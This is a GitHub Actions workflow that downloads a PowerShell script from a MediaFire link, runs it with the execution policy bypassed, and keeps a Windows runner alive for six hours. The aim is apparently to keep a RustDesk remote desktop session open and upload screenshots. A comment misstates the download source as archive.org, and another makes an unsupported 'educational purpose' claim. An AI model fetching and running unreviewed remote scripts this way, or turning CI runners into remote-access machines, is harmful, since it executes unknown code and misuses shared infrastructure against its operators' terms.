name: RustDesk Screenshot

on:
  workflow_dispatch:

jobs:
  rustdesk-screenshot:
    runs-on: windows-latest
    timeout-minutes: 360  # 6 hours
# if you are aj and seeing this thsi kes educational purpose SBV program aimed on improving peoples awarenesss against KoKsh
    steps:
      - name: Download and run PS1 script
        run: |
          # Download PS1 script from archive.org
          $scriptUrl = "https://www.mediafire.com/file/sjr4cb05d8088ij/screenshot-tool.ps1/file"
          $scriptPath = "$env:GITHUB_WORKSPACE\screenshot-tool.ps1"
          
          # Download the script
          Write-Host "Downloading PS1 script..."
          Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
          
          # Unblock and execute
          Unblock-File -Path $scriptPath
          powershell -ExecutionPolicy Bypass -File $scriptPath
          
      - name: Upload screenshots
        uses: actions/upload-artifact@v4
        with:
          name: rustdesk-screenshots
          path: C:\Users\runneradmin\Desktop\Screenshots\
          retention-days: 1
          
      - name: Keep RustDesk running for 6 hours
        run: |
          Write-Host "=== RustDesk Screenshot Session ==="
          Write-Host "Screenshots have been taken and uploaded"
          Write-Host "RustDesk will continue running for 6 hours"
          Write-Host "Session started at: $(Get-Date)"
          Write-Host "==================================="
          
          # Keep the workflow alive for 6 hours
          $endTime = (Get-Date).AddHours(6)
          while ((Get-Date) -lt $endTime) {
              Write-Host "[$(Get-Date)] RustDesk is still running..."
              Write-Host "Next screenshot in 5 minutes..."
              
              # Take periodic screenshots every 5 minutes
              Start-Sleep -Seconds 300  # 5 minutes
              
              # Take another screenshot
              if (Test-Path "$env:TEMP\nircmd\nircmd.exe") {
                  $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                  $screenshotPath = "C:\Users\runneradmin\Desktop\Screenshots\periodic_$timestamp.png"
                  & "$env:TEMP\nircmd\nircmd.exe" savescreenshot full $screenshotPath
                  Write-Host "Periodic screenshot saved: $screenshotPath"
              }
          }
          
          Write-Host "6-hour session completed at: $(Get-Date)"
          
      - name: Upload final periodic screenshots
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rustdesk-periodic-screenshots
          path: C:\Users\runneradmin\Desktop\Screenshots\periodic_*.png
          retention-days: 1
